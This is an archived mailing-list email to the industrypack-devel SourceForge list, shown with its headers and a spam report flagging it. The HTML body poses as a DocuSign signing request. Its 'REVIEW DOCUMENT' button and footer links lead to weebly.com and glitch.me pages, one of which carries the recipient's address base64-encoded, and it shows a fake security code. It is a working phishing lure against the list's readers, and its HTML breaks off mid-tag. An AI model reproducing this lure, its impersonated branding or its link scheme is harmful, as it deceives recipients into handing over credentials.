Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D29A09C875F
	for <lists+industrypack-devel@lfdr.de>; Thu, 14 Nov 2024 11:22:53 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1tBWzz-0007dO-MY
	for lists+industrypack-devel@lfdr.de;
	Thu, 14 Nov 2024 10:22:51 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <rkulkarni@examity.com>) id 1tBWzx-0007dI-VV
 for industrypack-devel@lists.sourceforge.net;
 Thu, 14 Nov 2024 10:22:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=z8JCCdfl2RSz0t5URYT6dFlboLviHmHZK1VfaNODKJk=; b=L4xzZ6O9ekRbTP36cKbjQSIYoe
 kDRMC2umHpT4IipqQwx+zQc0WGLP1nbilOTa0pKhzrUVcAxftbkI8Z9ySDLy21s1uMQtf8e9XQzkO
 NxCKV12XxE50pOOe1E4ZlQs82eVTfUtNk4oRDYgdWNDCB4NJ1Q2Um6Fg3CJ2FcNMh610=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=z8JCCdfl2RSz0t5URYT6dFlboLviHmHZK1VfaNODKJk=; b=M
 LjuMK6JUgQaM7ySk8X0sJYVVuKSiQCBeLi0bkwk2fKI4DBcvF/xrgdvQ+/cLJapCGr7OWUJ80mA54
 ZtFJqYnmP+bvFOAmF6xxisJP33ZPbkrbmWTTF/pPrpZt1Xc2FBQbuhBagruB193uSVzcq5PUKbGw5
 r3rahweza1k/YO6o=;
Received: from [185.227.111.7] (helo=tonop-1.localdomain)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1tBWzw-00019c-1y for industrypack-devel@lists.sourceforge.net;
 Thu, 14 Nov 2024 10:22:49 +0000
Received: from examity.com (localhost [127.0.0.1])
 by tonop-1.localdomain (Postfix) with ESMTP id 5E0D02439
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 14 Nov 2024 05:04:56 -0500 (EST)
To: industrypack-devel@lists.sourceforge.net
Date: 14 Nov 2024 02:04:56 -0800
Message-ID: <20241114020454.0CC3A280B3859170@examity.com>
MIME-Version: 1.0
X-Spam-Score: 7.6 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  You have received a documnent from CRA to review and sign.
 REVIEW DOCUMENT All documents pending please review Document: Declaration
 and Final Release.pdf Dear industrypack-devel, All members should kindly
 complete their DOC this week 
 Content analysis details:   (7.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [185.227.111.7 listed in zen.spamhaus.org]
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URIs: 5r678943683.weebly.com]
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [185.227.111.7 listed in sa-trusted.bondedsender.org]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [185.227.111.7 listed in bl.score.senderscore.com]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.6 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
 website + no rDNS
X-Headers-End: 1tBWzw-00019c-1y
Subject: [Industrypack-devel] Complete with DocuSign Tax Return:
 industrypack-devel@lists.sourceforge.net.pdf
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: CRA via DocuSign via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: CRA via DocuSign <rkulkarni@examity.com>
Content-Type: multipart/mixed; boundary="===============0787182484466872123=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============0787182484466872123==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_B03FB8B3.F3BE087B"


------=_NextPart_000_0012_B03FB8B3.F3BE087B
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body style=3D"MARGIN: 0.5em"><BR class=3DApple-interchange-newline>
<table role=3D"presentation" style=3D"FONT-SIZE: small; MAX-WIDTH: 640px; H=
EIGHT: 1263px; FONT-FAMILY: Arial, Helvetica, sans-serif; WIDTH: 673px; WHI=
TE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSF=
ORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPH=
ANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,25=
5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
-stroke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial">
<TBODY>
<TR>
<td style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px; M=
ARGIN: 0px; PADDING-RIGHT: 24px">
<img style=3D"VERTICAL-ALIGN: baseline; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" alt=3D"DocuSign" sr=
c=3D"cid:email-logo.png" width=3D"116" height=3D"25"></TD></TR>
<TR>
<td style=3D"PADDING-BOTTOM: 30px; PADDING-TOP: 0px; PADDING-LEFT: 24px; MA=
RGIN: 0px; PADDING-RIGHT: 24px">
<table role=3D"presentation" style=3D"COLOR: rgb(255,255,255); BACKGROUND-C=
OLOR: rgb(37,64,143)" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" al=
ign=3D"center" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, &quot;Sans Ser=
if&quot;; WIDTH: 520px; PADDING-BOTTOM: 36px; TEXT-ALIGN: center; PADDING-T=
OP: 28px; PADDING-LEFT: 36px; MARGIN: 0px; PADDING-RIGHT: 36px; border-radi=
us: 2px" align=3D"center">
<img style=3D"BORDER-LEFT-WIDTH: 0px; HEIGHT: 75px; BORDER-RIGHT-WIDTH: 0px=
; WIDTH: 75px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-=
BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGH=
T: 0px; BORDER-TOP-WIDTH: 0px" alt=3D"" src=3D"cid:docinvite-white.png" wid=
th=3D"75" height=3D"75">
<table role=3D"presentation" cellspacing=3D"0" cellpadding=3D"0" width=3D"1=
00%" border=3D"0">
<TBODY>
<TR>
<td style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; BORDER-BOT=
TOM: medium none; PADDING-TOP: 24px; MARGIN: 0px; BORDER-LEFT: medium none"=
 align=3D"center">&nbsp;You have received a documnent from CRA to review an=
d sign.</TD></TR></TBODY></TABLE>
<table role=3D"presentation" cellspacing=3D"0" cellpadding=3D"0" width=3D"1=
00%" border=3D"0">
<TBODY>
<TR>
<td style=3D"PADDING-TOP: 30px; MARGIN: 0px" align=3D"center">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px">
<table cellspacing=3D"0" cellpadding=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 15px; FONT-WEIGHT: bold; COLOR: rgb(51,51,51); TEXT=
-ALIGN: center; MARGIN: 0px; DISPLAY: block; BACKGROUND-COLOR: rgb(255,212,=
0); border-radius: 2px" height=3D"44" align=3D"center">
<A title=3D"Protected by Outlook: https://na3.docusign.net/signing/emails/v=
1-ad2c65f27f3e484c97ef18d3f571be24fa3a7a7824cc49a88ef9e1a3f7444b3d. Click o=
r tap to follow the link." style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WI=
DTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(51=
,51,51); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: =
0px; DISPLAY: inline-block; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; text=
-decoration-line: none; border-radius: 2px;=20
font-stretch: inherit; font-kerning: inherit; font-feature-settings: inheri=
t" href=3D"https://5r678943683.weebly.com/" rel=3D"noopener &#10;noreferrer=
" target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dht=
tps://doc-3783462378123782323-23789347634763489230.glitch.me%23%5B%5Bconver=
t_to_base64(-Email-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D17316002127400=
00&amp;usg=3DAOvVaw3v74z7b1i8LuPUER7hovqk">
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTT=
OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 24px; MARGIN: 0px; LINE-HEIGHT: 44=
px; PADDING-RIGHT: 24px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font=
-kerning: inherit; font-feature-settings: inherit">REVIEW DOCUMENT</SPAN></=
A></TD></TR></TBODY></TABLE><BR></DIV><BR>All documents pending please revi=
ew Document<STRONG>:</STRONG><SPAN>&nbsp;</SPAN>
Declaration and Final Release.pdf</TD></TR></TBODY></TABLE>
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: Helvetica, sans-serif; =
BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px=
; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PA=
DDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(33,78,159); =
font-stretch: inherit; font-kerning: inherit; font-feature-settings: inheri=
t; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-va=
riant-alternates: inherit"><BR></SPAN></TD></TR>
</TBODY></TABLE></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, &quot;Sans Ser=
if&quot;; COLOR: rgb(0,0,0); PADDING-BOTTOM: 24px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 24px; MARGIN: 0px; PADDING-RIGHT: 24px">
<SPAN style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: Helvet=
ica, Arial, "Sans Serif", serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTIC=
AL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(51,51,51); PADDING=
-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT=
: 20px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; f=
ont-kerning: inherit; font-feature-settings: inherit'>Dear industrypack-dev=
el,<BR><BR><FONT color=3D#000000><FONT color=3D#333333>
All members should kindly complete their DOC this week</FONT><BR></FONT><FO=
NT color=3D#000000><BR></FONT>Thank You,<BR><BR><BR aria-hidden=3Dtrue>
<DIV id=3Dm_3095110517515699034gmail-x_x_x_gmail-ox-14b806f64b-yiv690134554=
3yui_3_16_0_1_1480287346275_23922 style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZ=
E: 16px; FONT-FAMILY: helveticaneue, "helvetica neue", helvetica, arial, "l=
ucida grande", sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baselin=
e; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(33,33,33); OUTLINE-WIDTH: 0px; PADD=
ING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; =
MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH:=20
0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: i=
nherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; fo=
nt-variant-alternates: inherit'>
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: arial=
; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0=
px; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYL=
E: none; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WID=
TH: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-setting=
s: inherit">
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-AL=
IGN: baseline; BORDER-BOTTOM-WIDTH: 0px; OUTLINE-WIDTH: 0px; PADDING-BOTTOM=
: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0p=
x; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255=
,0); font-stretch: inherit; font-size-adjust: inherit"><FONT size=3D3>
<SPAN id=3Dm_3095110517515699034gmail-x_x_x_gmail-ox-14b806f64b-yiv69013455=
43yui_3_16_0_1_1480287346275_23921 style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SI=
ZE: small; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM=
-WIDTH: 0px; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUT=
LINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDE=
R-TOP-WIDTH: 0px; font-stretch: inherit; font-kerning: inherit; font-featur=
e-settings: inherit">
<SPAN id=3Dm_3095110517515699034gmail-x_x_x_gmail-ox-14b806f64b-yiv69013455=
43yui_3_16_0_1_1480287346275_23920 style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SI=
ZE: 10pt; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: ba=
seline; BORDER-BOTTOM-WIDTH: 0px; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; PADD=
ING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-kerning:=
 inherit; font-feature-settings: inherit">
<SPAN id=3Dm_3095110517515699034gmail-x_x_x_gmail-ox-14b806f64b-yiv69013455=
43yui_3_16_0_1_1480287346275_23919 style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-=
RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; OUTLI=
NE-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; =
PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; =
font-stretch: inherit; font-size-adjust: inherit"><STRONG>
Note: If you are unable to Review document file link, please move message t=
o Inbox<SPAN>&nbsp;</SPAN></STRONG><STRONG>folder.</STRONG></SPAN></SPAN></=
SPAN></FONT></SPAN></SPAN></DIV></SPAN></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 11px; FONT-FAMILY: Helvetica, Arial, &quot;Sans Ser=
if&quot;; COLOR: rgb(102,102,102); PADDING-BOTTOM: 12px; PADDING-TOP: 0px; =
PADDING-LEFT: 24px; MARGIN: 0px; PADDING-RIGHT: 24px">
<table cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
<TBODY>
<TR>
<td style=3D"VERTICAL-ALIGN: top; MARGIN: 0px" valign=3D"top">
<DIV style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: Helvetica, Arial, "Sans =
Serif", serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline=
; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 2px; PADDING-=
LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 5px; BORDER-TOP-WIDTH: 0px; font-str=
etch: inherit; font-kerning: inherit; font-feature-settings: inherit'>Power=
ed by&nbsp;</DIV></TD>
<td style=3D"MARGIN: 0px">
<img style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; VERTICAL-=
ALIGN: baseline; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: medium none; PADDING-=
RIGHT: 0px" alt=3D"Docusign" src=3D"cid:email-logo.png" height=3D"19" width=
=3D"86"></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"PADDING-BOTTOM: 45px; PADDING-TOP: 30px; PADDING-LEFT: 24px; M=
ARGIN: 0px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(234,234,234)">
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B role=3Dhe=
ading>Do Not Share This Email</B><BR>This email contains a secure link to D=
ocusign. Please do not share this email, link, or access code with others.<=
BR></P>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B role=3Dhe=
ading>Alternate Signing Method</B><BR>Visit Docusign.com, click 'Access Doc=
uments', and enter the security code:<BR>FA3A7AAN375UEYS64GNE47444B3D3</P>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B role=3Dhe=
ading>About Docusign</B><BR>Sign documents electronically in just minutes. =
It's safe, secure, and legally binding. Whether you're in an office, at hom=
e, on-the-go -- or even across the globe -- Docusign provides a professiona=
l trusted solution for Digital Transaction Management&#8482;.</P>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B role=3Dhe=
ading>Questions about the Document?</B><BR>If you need to modify the docume=
nt or have questions about the details in the document, please reach out to=
 the sender by emailing them directly.<BR><BR><B role=3Dheading>Stop receiv=
ing this email</B><BR>
<A title=3D"Protected by Outlook:=20
&#10;&#10;&#10;https://protect.docusign.net/report-abuse?e=3DAUtomjpFak9Glb=
PL0zFFi10jrq0aW3CwxeexiDonbFs-vPImm8h_MdBP-cS1XONeP9hfcu4MVU4RfW_SbcT23x374=
hvcFwm7sjvXg3MYvYV2FlDK_gqQjawqZYgnT3aAr8N_eLsleMa1DqPRp3dUcxAkvkN6L3ZWmQ5-=
Hat_hDw2gG6ngjqva0lLep0wiTS3Uu1YZHQdBK5xcwrjan9L2if-39NUFWlF_VS01PitHBUKCFs=
gwt38PyG1hNSLKNMoY0hQ6hrnEPxi91QMenPZ627ORJ3qyEB0AQaJroqXnT8a0WOUu79kgrqYOP=
0xgBGBSpiCRltds_NPcru6kavFo-yKHBW9FKoVAYsFVwJXTwcgeKvOvvqr43CWAm1PE1YRc7uYV=
LbWAyfYsPbqcDBxf5cIYvJgZOi5Vg1gfry0Oo4BREHFjZ-a&#10;
fed1QOhnV-&#10;e4kGLUQSqA&#10;B1Wd8xuQ-Fh4tcQ&amp;lang=3Den. Click or tap t=
o follow the link." style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0p=
x; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(36,99,209=
); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
ADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" href=3D"https://5r678943683.weebl=
y.com/" rel=3D"noopener noreferrer" target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://doc-37834623=
78123782323-23789347634763489230.glitch.me%23%5B%5Bconvert_to_base64(-Email=
-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D1731600212740000&amp;usg=3DAOvVa=
w3v74z7b1i8LuPUER7hovqk">Report this email</A><SPAN>&nbsp;</SPAN>
&nbsp;or read more about&nbsp;<A title=3D"Protected by Outlook: https://sup=
port.docusign.com/en/guides/Declining-to-sign-DocuSign-Signer-Guide. Click =
or tap to follow the link." style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(3=
6,99,209); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN=
: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" href=3D"https://5r6789436=
83.weebly.com/" rel=3D"noopener noreferrer" target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://doc-37834623=
78123782323-23789347634763489230.glitch.me%23%5B%5Bconvert_to_base64(-Email=
-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D1731600212740000&amp;usg=3DAOvVa=
w3v74z7b1i8LuPUER7hovqk">Declining to sign</A><SPAN>&nbsp;</SPAN>
&nbsp;and&nbsp;<A title=3D"Protected by Outlook: https://support.docusign.c=
om/en/articles/How-do-I-manage-my-email-notifications. Click or tap to foll=
ow the link." style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VER=
TICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(36,99,209); PAD=
DING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING=
-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"=20
href=3D"https://doc-3783462378123782323-23789347634763489230.glitch.me/#aW5=
kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldA=3D=3D" rel=3D"noopener =
noreferrer" target=3D_blank data-saferedirecturl=3D"https://www.google.com/=
url?q=3Dhttps://doc-3783462378123782323-23789347634763489230.glitch.me%23%5=
B%5Bconvert_to_base64(-Email-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D1731=
600212740000&amp;usg=3DAOvVaw3v74z7b1i8LuPUER7hovqk">Managing notifications=
</A>.<BR><BR>
If you have trouble signing, visit "<A title=3D"Protected by Outlook: https=
://support.docusign.com/s/articles/How-do-I-sign-a-DocuSign-document-Basic-=
Signing?language=3Den_US&amp;utm_campaign=3DGBL_XX_DBU_UPS_2211_SignNotific=
ationEmailFooter&amp;utm_medium=3Dproduct&amp;utm_source=3Dpostsend. Click =
or tap to follow the link." style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(3=
6,99,209); PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=20
PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" =
href=3D"https://5r678943683.weebly.com/" rel=3D"noopener noreferrer" target=
=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://do=
c-3783462378123782323-23789347634763489230.glitch.me%23%5B%5Bconvert_to_bas=
e64(-Email-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D1731600212740000&amp;u=
sg=3DAOvVaw3v74z7b1i8LuPUER7hovqk">How to Sign a Document</A><SPAN>&nbsp;</=
SPAN>
" on our&nbsp;<A title=3D"Protected by Outlook: https://support.docusign.co=
m/. Click or tap to follow the link." style=3D"BORDER-LEFT-WIDTH: 0px; BORD=
ER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; CO=
LOR: rgb(36,99,209); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" href=3D"https:/=
/5r678943683.weebly.com/" rel=3D"noopener noreferrer" target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://doc-37834623=
78123782323-23789347634763489230.glitch.me%23%5B%5Bconvert_to_base64(-Email=
-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D1731600212740000&amp;usg=3DAOvVa=
w3v74z7b1i8LuPUER7hovqk">Docusign Support Center</A><SPAN>&nbsp;</SPAN>
, or browse our&nbsp;<A title=3D"Protected by Outlook: https://community.do=
cusign.com/esignature-111?utm_campaign=3DGBL_US_PRD_AWA_2405_CommunityCTA&a=
mp;utm_medium=3Demail&amp;utm_source=3Dpostsend. Click or tap to follow the=
 link." style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-=
ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(36,99,209); PADDING-B=
OTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT=
: 0px; BORDER-TOP-WIDTH: 0px"=20
href=3D"https://5r678943683.weebly.com/" rel=3D"noopener noreferrer" target=
=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://do=
c-3783462378123782323-23789347634763489230.glitch.me%23%5B%5Bconvert_to_bas=
e64(-Email-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D1731600212740000&amp;u=
sg=3DAOvVaw3v74z7b1i8LuPUER7hovqk">Docusign Community</A>&nbsp;for more inf=
ormation.<BR><BR></P>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'>
<A title=3D"Protected by Outlook: https://www.docusign.com/features-and-ben=
efits/mobile?utm_campaign=3DGBL_XX_DBU_UPS_2211_SignNotificationEmailFooter=
&amp;utm_medium=3Dproduct&amp;utm_source=3Dpostsend. Click or tap to follow=
